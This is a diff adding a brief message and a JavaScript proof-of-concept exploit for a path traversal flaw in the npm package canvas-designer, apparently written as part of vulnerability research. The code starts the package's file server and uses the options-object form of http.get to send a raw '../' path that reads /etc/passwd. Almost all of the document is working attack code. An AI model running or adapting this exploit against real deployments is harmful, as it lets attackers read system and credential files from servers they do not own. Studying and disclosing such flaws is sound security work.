@@ -1,0 +1,35 @@
+Confirmed and cleaned up. Here's the exploit:
+
+```javascript
+// Path Traversal in canvas-designer's server.js (used as main entry point).
+// The request pathname is joined with process.cwd() using path.join()
+// without any sanitization of ".." segments, allowing arbitrary file
+// disclosure outside the intended web root.
+
+process.env.PORT = 9124;
+require("canvas-designer"); // starts the vulnerable HTTP file server on PORT
+
+setTimeout(() => {
+  const http = require("http");
+
+  // Using the options-object form of http.get bypasses WHATWG URL
+  // normalization, so the raw "../" traversal sequence reaches the server
+  // unmodified.
+  http.get(
+    {
+      hostname: "127.0.0.1",
+      port: 9124,
+      path: "/../../../../../../../../etc/passwd",
+    },
+    (res) => {
+      let data = "";
+      res.on("data", (chunk) => (data += chunk));
+      res.on("end", () => {
+        console.log("Status:", res.statusCode);
+        console.log(data); // dumps /etc/passwd contents, outside the server's cwd
+        process.exit(0);
+      });
+    }
+  );
+}, 500);
+```
